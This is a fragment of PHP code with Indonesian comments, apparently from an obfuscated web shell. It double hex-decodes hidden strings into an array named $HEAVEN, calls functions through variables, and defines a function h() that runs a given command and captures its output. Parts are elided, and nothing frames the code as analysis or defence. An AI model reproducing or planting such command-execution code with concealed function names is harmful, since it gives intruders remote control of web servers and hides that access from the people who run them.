...
foreach ($Array as $hexString) {
    $HEAVEN[] = hex2bin(hex2bin($hexString));
}
...
// Gunakan $HEAVEN sesuai kebutuhan
$a = $HEAVEN[0];
$b = $HEAVEN[1];
$c = $a . $b;
...
function h($command, $workingDirectory = null)
{
    ...
    if ($IR($process)) {
        ...
        $output_stdout = $j($pipes[1]); // Ganti dengan $HEAVEN[6] jika diperlukan
        $output_stderr = $j($pipes[2]); // Ganti dengan $HEAVEN[6] jika diperlukan
